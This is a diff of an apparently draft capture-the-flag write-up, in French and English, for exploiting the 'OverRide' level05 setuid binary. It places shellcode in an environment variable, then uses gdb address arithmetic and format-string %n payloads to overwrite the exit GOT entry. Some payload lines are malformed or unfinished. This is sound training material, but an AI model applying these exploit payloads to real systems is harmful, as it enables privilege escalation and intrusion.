@@ -34,9 +34,14 @@ export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x
 ```
 
 ```gdb
-(gdb)  x/s *((char **)environ+0)  
-<!-- 0xffffd702:      "EXPLOIT=<...>" -->
-0xffffd74a:      "EXPLOIT=<...>"
+(gdb) x/s *((char **)environ+0)
+0xffffd72f:      "EXPLOIT=\220\220\220"...
+
+(gdb) p/d 0xffffd72f+200
+$1 = 4294957047
+(gdb) p/x 0xffffd72f+200
+$2 = 0xffffd7f7
+```
 
 (gdb)  p/d 0xffffd74a+200
 $1 = 4294957074
@@ -58,21 +63,6 @@ $5 = 65535
 (gdb) p/d 0xffff-55314  
 $6 = 10221  
 ```
-
-
-iRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE  
-No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05  
-  
-level05@OverRide:~$ file level05   
-level05: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x1a9c02d3aeffff53ee0aa8c7730cbcb1ab34270e, not strippe  
-  
-We c
-
-Le programme actuel recupere la string de gets et transforme les minuscules en majuscules.  
-Le premier argument du printf a *main+195 est notre string, ce qui correspond a une faille de type format string  
-  
-level05@OverRide:~$ (python -c "print 'aaaa' + '%p ' * 30";cat) | ./level05  
-aaaa0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070  
   
 Nous pouvons voir que notre string 'aaaa' apparait au printf access parameter numero 10  
   
@@ -99,15 +89,27 @@ $5 = 65535
 (gdb) p/d 0xffff-55314  
 $6 = 10221  
   
-adresse exit: 0x80497e0  
-  
+We get exit function address:
+
+```gdb
 (gdb) info function exit  
 All functions matching regular expression "exit":  
   
 Non-debugging symbols:  
 0x08048370  exit  
 0x08048370  exit@plt  
-  
+...
+(gdb) disas 0x08048370
+Dump of assembler code for function exit@plt:
+   0x08048370 <+0>:     jmp    *0x80497e0
+   0x08048376 <+6>:     push   $0x18
+   0x0804837b <+11>:    jmp    0x8048330
+```
+4294957047
+
+r <<<$(python -c "print '\xe0\x97\x04\x08' + %4294957047\$x + '%10\$n'")
+
+
 (gdb) r <<<$(python -c "print '\xe0\x97\x04\x08' + '%4294957070\$n'")
 0x0804847a in main ()
 (gdb) x/wx $esp
